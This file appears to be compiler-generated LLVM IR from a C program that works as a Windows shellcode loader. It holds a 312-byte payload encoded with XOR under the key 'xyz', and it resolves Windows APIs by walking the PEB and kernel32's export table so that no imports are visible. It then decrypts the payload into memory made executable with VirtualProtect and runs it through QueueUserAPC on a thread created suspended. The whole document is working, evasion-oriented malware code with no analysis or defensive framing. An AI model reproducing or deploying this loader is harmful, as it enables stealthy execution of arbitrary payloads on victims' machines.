; ModuleID = 'output/t1.c'
source_filename = "output/t1.c"
target datalayout = "e-m:w-p270:32:32-p271:32:32-p272:64:64-i64:64-i128:128-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-windows-gnu"

%struct._IMAGE_DOS_HEADER = type { i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, i16, [4 x i16], i16, i16, [10 x i16], i32 }
%struct._IMAGE_NT_HEADERS64 = type { i32, %struct._IMAGE_FILE_HEADER, %struct._IMAGE_OPTIONAL_HEADER64 }
%struct._IMAGE_FILE_HEADER = type { i16, i16, i32, i32, i32, i16, i16 }
%struct._IMAGE_OPTIONAL_HEADER64 = type { i16, i8, i8, i32, i32, i32, i32, i32, i64, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i16, i16, i64, i64, i64, i64, i32, i32, [16 x %struct._IMAGE_DATA_DIRECTORY] }
%struct._IMAGE_DATA_DIRECTORY = type { i32, i32 }
%struct._IMAGE_EXPORT_DIRECTORY = type { i32, i32, i16, i16, i32, i32, i32, i32, i32, i32, i32 }
%struct._PEB = type { i8, i8, i8, i8, ptr, ptr, ptr }
%struct._PEB_LDR_DATA = type { i32, i8, ptr, %struct._LIST_ENTRY, %struct._LIST_ENTRY, %struct._LIST_ENTRY }
%struct._LIST_ENTRY = type { ptr, ptr }
%struct._LDR_DATA_TABLE_ENTRY = type { %struct._LIST_ENTRY, %struct._LIST_ENTRY, %struct._LIST_ENTRY, ptr, ptr, i32, %struct._UNICODE_STRING, %struct._UNICODE_STRING, i32, i16, i16, %struct._LIST_ENTRY, ptr, i32, i32, ptr, ptr, ptr }
%struct._UNICODE_STRING = type { i16, i16, ptr }

@shellcode = dso_local global [312 x i8] c"\841\FB\9C\89\85\87\86\92\B4yzx8+9)()/2I\AB\1F0\F2(\181\F1*a2\F3+Z5H\B30v\CD232\F3\0B*0H\BA\D4E\1B\04{VX8\BB\B1t;y\B8\98\95+;)1\F1*Y\F1:E2y\A9\1C\F9\01bs{u\FD\0Bzxy\F1\F8\F1zxy2\FD\B9\0E\1F1{\A8=\F18Y\F10a*1x\AA\9B/7I\B02\87\B0;\F3M\F20x\AC0H\BA\D48\BB\B1t;y\B8B\98\0C\8B4z6\\q?A\A8\0F\A0!>\F39^1x\AA\1E8\F1t1>\F39f1x\AA9\F2~\F01{\A88\229!$!#; 8#9#2\FB\95Z9+\85\98!;!#2\F3k\933\86\85\87$\92syzx\0C\09\1D\0BIJW\1E\14\15z!8\C04\0E\\\7F\86\AF1\BE\BBxyzx\91lxyz0\1C\16\14\16Z\1E\0B\15\15Y)\10\1C\16\14\1A\15\1C\1C[x#\92}yzx-\1F\0B\0Dz9!2I\B0;\C2<\F9.~\85\AD1K\B18\C0\88\CC\D8.\86\AF", align 16
@shellcode_len = dso_local global i32 312, align 4
@.str = private unnamed_addr constant [13 x i8] c"kernel32.dll\00", align 1
@enc_len = dso_local global i64 312, align 8
@key = dso_local global [4 x i8] c"xyz\00", align 1
@SleepEx_ptr = dso_local global ptr null, align 8
@VirtualAlloc_ptr = dso_local global ptr null, align 8
@memcpy_ptr = dso_local global ptr null, align 8
@VirtualProtect_ptr = dso_local global ptr null, align 8
@QueueUserAPC_ptr = dso_local global ptr null, align 8
@kernel32baseAddr = dso_local global ptr null, align 8
@.str.1 = private unnamed_addr constant [15 x i8] c"GetProcAddress\00", align 1
@ptrGetProcAddress = dso_local global ptr null, align 8
@.str.2 = private unnamed_addr constant [13 x i8] c"LoadLibraryA\00", align 1
@ptrLoadLibraryA = dso_local global ptr null, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"msvcr120_clr0400.dll\00", align 1
@msvcr120_clr0400_mod = dso_local global ptr null, align 8
@kernel32_mod = dso_local global ptr null, align 8
@.str.4 = private unnamed_addr constant [7 x i8] c"memcpy\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"CloseHandle\00", align 1
@CloseHandle_ptr = dso_local global ptr null, align 8
@.str.6 = private unnamed_addr constant [15 x i8] c"VirtualProtect\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"WaitForSingleObject\00", align 1
@WaitForSingleObject_ptr = dso_local global ptr null, align 8
@.str.8 = private unnamed_addr constant [8 x i8] c"SleepEx\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"ResumeThread\00", align 1
@ResumeThread_ptr = dso_local global ptr null, align 8
@.str.10 = private unnamed_addr constant [7 x i8] c"printf\00", align 1
@printf_ptr = dso_local global ptr null, align 8
@.str.11 = private unnamed_addr constant [13 x i8] c"QueueUserAPC\00", align 1
@.str.12 = private unnamed_addr constant [13 x i8] c"VirtualAlloc\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"CreateThread\00", align 1
@CreateThread_ptr = dso_local global ptr null, align 8
@.str.14 = private unnamed_addr constant [18 x i8] c"didn't queue APC\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local ptr @GetProcAddressKernel32(ptr noundef %0, ptr noundef %1) #0 {
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca ptr, align 8
  %6 = alloca ptr, align 8
  %7 = alloca ptr, align 8
  %8 = alloca ptr, align 8
  %9 = alloca ptr, align 8
  %10 = alloca ptr, align 8
  %11 = alloca ptr, align 8
  %12 = alloca i32, align 4
  %13 = alloca ptr, align 8
  store ptr %0, ptr %4, align 8
  store ptr %1, ptr %5, align 8
  %14 = load ptr, ptr %4, align 8
  store ptr %14, ptr %6, align 8
  %15 = load ptr, ptr %4, align 8
  %16 = load ptr, ptr %6, align 8
  %17 = getelementptr inbounds %struct._IMAGE_DOS_HEADER, ptr %16, i32 0, i32 18
  %18 = load i32, ptr %17, align 2
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, ptr %15, i64 %19
  store ptr %20, ptr %7, align 8
  %21 = load ptr, ptr %4, align 8
  %22 = load ptr, ptr %7, align 8
  %23 = getelementptr inbounds %struct._IMAGE_NT_HEADERS64, ptr %22, i32 0, i32 2
  %24 = getelementptr inbounds %struct._IMAGE_OPTIONAL_HEADER64, ptr %23, i32 0, i32 29
  %25 = getelementptr inbounds [16 x %struct._IMAGE_DATA_DIRECTORY], ptr %24, i64 0, i64 0
  %26 = getelementptr inbounds %struct._IMAGE_DATA_DIRECTORY, ptr %25, i32 0, i32 0
  %27 = load i32, ptr %26, align 4
  %28 = zext i32 %27 to i64
  %29 = getelementptr inbounds i8, ptr %21, i64 %28
  store ptr %29, ptr %8, align 8
  %30 = load ptr, ptr %4, align 8
  %31 = load ptr, ptr %8, align 8
  %32 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %31, i32 0, i32 8
  %33 = load i32, ptr %32, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i8, ptr %30, i64 %34
  store ptr %35, ptr %9, align 8
  %36 = load ptr, ptr %4, align 8
  %37 = load ptr, ptr %8, align 8
  %38 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %37, i32 0, i32 9
  %39 = load i32, ptr %38, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i8, ptr %36, i64 %40
  store ptr %41, ptr %10, align 8
  %42 = load ptr, ptr %4, align 8
  %43 = load ptr, ptr %8, align 8
  %44 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %43, i32 0, i32 10
  %45 = load i32, ptr %44, align 4
  %46 = zext i32 %45 to i64
  %47 = getelementptr inbounds i8, ptr %42, i64 %46
  store ptr %47, ptr %11, align 8
  store i32 0, ptr %12, align 4
  br label %48

48:                                               ; preds = %81, %2
  %49 = load i32, ptr %12, align 4
  %50 = load ptr, ptr %8, align 8
  %51 = getelementptr inbounds %struct._IMAGE_EXPORT_DIRECTORY, ptr %50, i32 0, i32 7
  %52 = load i32, ptr %51, align 4
  %53 = icmp ult i32 %49, %52
  br i1 %53, label %54, label %84

54:                                               ; preds = %48
  %55 = load ptr, ptr %4, align 8
  %56 = load ptr, ptr %10, align 8
  %57 = load i32, ptr %12, align 4
  %58 = zext i32 %57 to i64
  %59 = getelementptr inbounds i32, ptr %56, i64 %58
  %60 = load i32, ptr %59, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds i8, ptr %55, i64 %61
  store ptr %62, ptr %13, align 8
  %63 = load ptr, ptr %13, align 8
  %64 = load ptr, ptr %5, align 8
  %65 = call i32 @strcmp(ptr noundef %63, ptr noundef %64)
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %80

67:                                               ; preds = %54
  %68 = load ptr, ptr %4, align 8
  %69 = load ptr, ptr %9, align 8
  %70 = load ptr, ptr %11, align 8
  %71 = load i32, ptr %12, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i16, ptr %70, i64 %72
  %74 = load i16, ptr %73, align 2
  %75 = zext i16 %74 to i64
  %76 = getelementptr inbounds i32, ptr %69, i64 %75
  %77 = load i32, ptr %76, align 4
  %78 = zext i32 %77 to i64
  %79 = getelementptr inbounds i8, ptr %68, i64 %78
  store ptr %79, ptr %3, align 8
  br label %85

80:                                               ; preds = %54
  br label %81

81:                                               ; preds = %80
  %82 = load i32, ptr %12, align 4
  %83 = add i32 %82, 1
  store i32 %83, ptr %12, align 4
  br label %48, !llvm.loop !5

84:                                               ; preds = %48
  store ptr null, ptr %3, align 8
  br label %85

85:                                               ; preds = %84, %67
  %86 = load ptr, ptr %3, align 8
  ret ptr %86
}

declare dso_local i32 @strcmp(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local ptr @getkernel32baseAddr() #0 {
  %1 = alloca ptr, align 8
  %2 = alloca ptr, align 8
  %3 = alloca ptr, align 8
  %4 = alloca ptr, align 8
  %5 = alloca [256 x i8], align 16
  %6 = alloca i32, align 4
  store ptr null, ptr %4, align 8
  %7 = call ptr asm "mov %gs:0x60, $0", "=r,~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !7
  store ptr %7, ptr %1, align 8
  %8 = load ptr, ptr %1, align 8
  %9 = getelementptr inbounds %struct._PEB, ptr %8, i32 0, i32 6
  %10 = load ptr, ptr %9, align 8
  %11 = getelementptr inbounds %struct._PEB_LDR_DATA, ptr %10, i32 0, i32 3
  %12 = getelementptr inbounds %struct._LIST_ENTRY, ptr %11, i32 0, i32 0
  %13 = load ptr, ptr %12, align 8
  store ptr %13, ptr %3, align 8
  br label %14

14:                                               ; preds = %64, %0
  %15 = load ptr, ptr %3, align 8
  %16 = getelementptr inbounds i8, ptr %15, i64 0
  store ptr %16, ptr %2, align 8
  store i32 0, ptr %6, align 4
  br label %17

17:                                               ; preds = %46, %14
  %18 = load i32, ptr %6, align 4
  %19 = sext i32 %18 to i64
  %20 = load ptr, ptr %2, align 8
  %21 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %20, i32 0, i32 7
  %22 = getelementptr inbounds %struct._UNICODE_STRING, ptr %21, i32 0, i32 0
  %23 = load i16, ptr %22, align 8
  %24 = zext i16 %23 to i64
  %25 = udiv i64 %24, 2
  %26 = icmp ult i64 %19, %25
  br i1 %26, label %27, label %31

27:                                               ; preds = %17
  %28 = load i32, ptr %6, align 4
  %29 = sext i32 %28 to i64
  %30 = icmp ult i64 %29, 255
  br label %31

31:                                               ; preds = %27, %17
  %32 = phi i1 [ false, %17 ], [ %30, %27 ]
  br i1 %32, label %33, label %49

33:                                               ; preds = %31
  %34 = load ptr, ptr %2, align 8
  %35 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %34, i32 0, i32 7
  %36 = getelementptr inbounds %struct._UNICODE_STRING, ptr %35, i32 0, i32 2
  %37 = load ptr, ptr %36, align 8
  %38 = load i32, ptr %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i16, ptr %37, i64 %39
  %41 = load i16, ptr %40, align 2
  %42 = trunc i16 %41 to i8
  %43 = load i32, ptr %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 %44
  store i8 %42, ptr %45, align 1
  br label %46

46:                                               ; preds = %33
  %47 = load i32, ptr %6, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, ptr %6, align 4
  br label %17, !llvm.loop !8

49:                                               ; preds = %31
  %50 = load i32, ptr %6, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 %51
  store i8 0, ptr %52, align 1
  %53 = getelementptr inbounds [256 x i8], ptr %5, i64 0, i64 0
  %54 = call i32 @_stricmp(ptr noundef %53, ptr noundef @.str)
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %60

56:                                               ; preds = %49
  %57 = load ptr, ptr %2, align 8
  %58 = getelementptr inbounds %struct._LDR_DATA_TABLE_ENTRY, ptr %57, i32 0, i32 3
  %59 = load ptr, ptr %58, align 8
  store ptr %59, ptr %4, align 8
  br label %60

60:                                               ; preds = %56, %49
  %61 = load ptr, ptr %3, align 8
  %62 = getelementptr inbounds %struct._LIST_ENTRY, ptr %61, i32 0, i32 0
  %63 = load ptr, ptr %62, align 8
  store ptr %63, ptr %3, align 8
  br label %64

64:                                               ; preds = %60
  %65 = load ptr, ptr %3, align 8
  %66 = load ptr, ptr %1, align 8
  %67 = getelementptr inbounds %struct._PEB, ptr %66, i32 0, i32 6
  %68 = load ptr, ptr %67, align 8
  %69 = getelementptr inbounds %struct._PEB_LDR_DATA, ptr %68, i32 0, i32 3
  %70 = icmp ne ptr %65, %69
  br i1 %70, label %14, label %71, !llvm.loop !9

71:                                               ; preds = %64
  %72 = load ptr, ptr %4, align 8
  ret ptr %72
}

declare dllimport i32 @_stricmp(ptr noundef, ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @AlterableFunction2() #0 {
  %1 = load ptr, ptr @SleepEx_ptr, align 8
  %2 = call i32 %1(i32 noundef -1, i32 noundef 1)
  ret i32 0
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @xor_decrypt(ptr noundef %0, i64 noundef %1, ptr noundef %2) #0 {
  %4 = alloca ptr, align 8
  %5 = alloca i64, align 8
  %6 = alloca ptr, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  store ptr %0, ptr %4, align 8
  store i64 %1, ptr %5, align 8
  store ptr %2, ptr %6, align 8
  %9 = load ptr, ptr %6, align 8
  %10 = call i64 @strlen(ptr noundef %9)
  store i64 %10, ptr %7, align 8
  store i64 0, ptr %8, align 8
  br label %11

11:                                               ; preds = %30, %3
  %12 = load i64, ptr %8, align 8
  %13 = load i64, ptr %5, align 8
  %14 = icmp ult i64 %12, %13
  br i1 %14, label %15, label %33

15:                                               ; preds = %11
  %16 = load ptr, ptr %6, align 8
  %17 = load i64, ptr %8, align 8
  %18 = load i64, ptr %7, align 8
  %19 = urem i64 %17, %18
  %20 = getelementptr inbounds i8, ptr %16, i64 %19
  %21 = load i8, ptr %20, align 1
  %22 = sext i8 %21 to i32
  %23 = load ptr, ptr %4, align 8
  %24 = load i64, ptr %8, align 8
  %25 = getelementptr inbounds i8, ptr %23, i64 %24
  %26 = load i8, ptr %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %22
  %29 = trunc i32 %28 to i8
  store i8 %29, ptr %25, align 1
  br label %30

30:                                               ; preds = %15
  %31 = load i64, ptr %8, align 8
  %32 = add i64 %31, 1
  store i64 %32, ptr %8, align 8
  br label %11, !llvm.loop !10

33:                                               ; preds = %11
  ret void
}

declare dso_local i64 @strlen(ptr noundef) #1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @gogogo(ptr noundef %0, ptr noundef %1, i64 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca ptr, align 8
  %6 = alloca ptr, align 8
  %7 = alloca i64, align 8
  %8 = alloca ptr, align 8
  %9 = alloca i32, align 4
  store ptr %0, ptr %5, align 8
  store ptr %1, ptr %6, align 8
  store i64 %2, ptr %7, align 8
  store ptr null, ptr %8, align 8
  store i32 0, ptr %9, align 4
  %10 = load ptr, ptr @VirtualAlloc_ptr, align 8
  %11 = load i64, ptr %7, align 8
  %12 = call ptr %10(ptr noundef null, i64 noundef %11, i32 noundef 12288, i32 noundef 4)
  store ptr %12, ptr %8, align 8
  %13 = load ptr, ptr %8, align 8
  %14 = icmp eq ptr %13, null
  br i1 %14, label %15, label %16

15:                                               ; preds = %3
  store i32 0, ptr %4, align 4
  br label %36

16:                                               ; preds = %3
  %17 = load ptr, ptr @memcpy_ptr, align 8
  %18 = load ptr, ptr %8, align 8
  %19 = load ptr, ptr %6, align 8
  %20 = load i64, ptr %7, align 8
  %21 = call ptr %17(ptr noundef %18, ptr noundef %19, i64 noundef %20)
  %22 = load ptr, ptr @VirtualProtect_ptr, align 8
  %23 = load ptr, ptr %8, align 8
  %24 = load i64, ptr %7, align 8
  %25 = call i32 %22(ptr noundef %23, i64 noundef %24, i32 noundef 64, ptr noundef %9)
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %28, label %27

27:                                               ; preds = %16
  store i32 0, ptr %4, align 4
  br label %36

28:                                               ; preds = %16
  %29 = load ptr, ptr @QueueUserAPC_ptr, align 8
  %30 = load ptr, ptr %8, align 8
  %31 = load ptr, ptr %5, align 8
  %32 = call i32 %29(ptr noundef %30, ptr noundef %31, i64 noundef 0)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %35, label %34

34:                                               ; preds = %28
  store i32 0, ptr %4, align 4
  br label %36

35:                                               ; preds = %28
  store i32 1, ptr %4, align 4
  br label %36

36:                                               ; preds = %35, %34, %27, %15
  %37 = load i32, ptr %4, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca ptr, align 8
  store i32 0, ptr %1, align 4
  %3 = call ptr @getkernel32baseAddr()
  store ptr %3, ptr @kernel32baseAddr, align 8
  %4 = load ptr, ptr @kernel32baseAddr, align 8
  %5 = call ptr @GetProcAddressKernel32(ptr noundef %4, ptr noundef @.str.1)
  store ptr %5, ptr @ptrGetProcAddress, align 8
  %6 = load ptr, ptr @kernel32baseAddr, align 8
  %7 = call ptr @GetProcAddressKernel32(ptr noundef %6, ptr noundef @.str.2)
  store ptr %7, ptr @ptrLoadLibraryA, align 8
  %8 = load ptr, ptr @ptrLoadLibraryA, align 8
  %9 = call ptr %8(ptr noundef @.str.3)
  store ptr %9, ptr @msvcr120_clr0400_mod, align 8
  %10 = load ptr, ptr @ptrLoadLibraryA, align 8
  %11 = call ptr %10(ptr noundef @.str)
  store ptr %11, ptr @kernel32_mod, align 8
  %12 = load ptr, ptr @ptrGetProcAddress, align 8
  %13 = load ptr, ptr @msvcr120_clr0400_mod, align 8
  %14 = call ptr %12(ptr noundef %13, ptr noundef @.str.4)
  store ptr %14, ptr @memcpy_ptr, align 8
  %15 = load ptr, ptr @ptrGetProcAddress, align 8
  %16 = load ptr, ptr @kernel32_mod, align 8
  %17 = call ptr %15(ptr noundef %16, ptr noundef @.str.5)
  store ptr %17, ptr @CloseHandle_ptr, align 8
  %18 = load ptr, ptr @ptrGetProcAddress, align 8
  %19 = load ptr, ptr @kernel32_mod, align 8
  %20 = call ptr %18(ptr noundef %19, ptr noundef @.str.6)
  store ptr %20, ptr @VirtualProtect_ptr, align 8
  %21 = load ptr, ptr @ptrGetProcAddress, align 8
  %22 = load ptr, ptr @kernel32_mod, align 8
  %23 = call ptr %21(ptr noundef %22, ptr noundef @.str.7)
  store ptr %23, ptr @WaitForSingleObject_ptr, align 8
  %24 = load ptr, ptr @ptrGetProcAddress, align 8
  %25 = load ptr, ptr @kernel32_mod, align 8
  %26 = call ptr %24(ptr noundef %25, ptr noundef @.str.8)
  store ptr %26, ptr @SleepEx_ptr, align 8
  %27 = load ptr, ptr @ptrGetProcAddress, align 8
  %28 = load ptr, ptr @kernel32_mod, align 8
  %29 = call ptr %27(ptr noundef %28, ptr noundef @.str.9)
  store ptr %29, ptr @ResumeThread_ptr, align 8
  %30 = load ptr, ptr @ptrGetProcAddress, align 8
  %31 = load ptr, ptr @msvcr120_clr0400_mod, align 8
  %32 = call ptr %30(ptr noundef %31, ptr noundef @.str.10)
  store ptr %32, ptr @printf_ptr, align 8
  %33 = load ptr, ptr @ptrGetProcAddress, align 8
  %34 = load ptr, ptr @kernel32_mod, align 8
  %35 = call ptr %33(ptr noundef %34, ptr noundef @.str.11)
  store ptr %35, ptr @QueueUserAPC_ptr, align 8
  %36 = load ptr, ptr @ptrGetProcAddress, align 8
  %37 = load ptr, ptr @kernel32_mod, align 8
  %38 = call ptr %36(ptr noundef %37, ptr noundef @.str.12)
  store ptr %38, ptr @VirtualAlloc_ptr, align 8
  %39 = load ptr, ptr @ptrGetProcAddress, align 8
  %40 = load ptr, ptr @kernel32_mod, align 8
  %41 = call ptr %39(ptr noundef %40, ptr noundef @.str.13)
  store ptr %41, ptr @CreateThread_ptr, align 8
  %42 = load ptr, ptr @CreateThread_ptr, align 8
  %43 = call ptr %42(ptr noundef null, i64 noundef 0, ptr noundef @AlterableFunction2, ptr noundef null, i32 noundef 4, ptr noundef null)
  store ptr %43, ptr %2, align 8
  %44 = load ptr, ptr %2, align 8
  %45 = icmp ne ptr %44, null
  br i1 %45, label %47, label %46

46:                                               ; preds = %0
  store i32 1, ptr %1, align 4
  br label %64

47:                                               ; preds = %0
  call void @xor_decrypt(ptr noundef @shellcode, i64 noundef 312, ptr noundef @key)
  %48 = load ptr, ptr %2, align 8
  %49 = call i32 @gogogo(ptr noundef %48, ptr noundef @shellcode, i64 noundef 312)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

51:                                               ; preds = %47
  %52 = load ptr, ptr @printf_ptr, align 8
  %53 = call i32 %52(ptr noundef @.str.14)
  br label %54

54:                                               ; preds = %51, %47
  %55 = load ptr, ptr @ResumeThread_ptr, align 8
  %56 = load ptr, ptr %2, align 8
  %57 = call i32 %55(ptr noundef %56)
  %58 = load ptr, ptr @WaitForSingleObject_ptr, align 8
  %59 = load ptr, ptr %2, align 8
  %60 = call i32 %58(ptr noundef %59, i32 noundef -1)
  %61 = load ptr, ptr @CloseHandle_ptr, align 8
  %62 = load ptr, ptr %2, align 8
  %63 = call i32 %61(ptr noundef %62)
  store i32 0, ptr %1, align 4
  br label %64

64:                                               ; preds = %54, %46
  %65 = load i32, ptr %1, align 4
  ret i32 %65
}

attributes #0 = { noinline nounwind optnone uwtable "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind memory(none) }

!llvm.module.flags = !{!0, !1, !2, !3}
!llvm.ident = !{!4}

!0 = !{i32 1, !"wchar_size", i32 2}
!1 = !{i32 8, !"PIC Level", i32 2}
!2 = !{i32 7, !"uwtable", i32 2}
!3 = !{i32 1, !"MaxTLSAlign", i32 65536}
!4 = !{!"Ubuntu clang version 18.1.3 (1ubuntu1)"}
!5 = distinct !{!5, !6}
!6 = !{!"llvm.loop.mustprogress"}
!7 = !{i64 15868025}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !6}
!10 = distinct !{!10, !6}
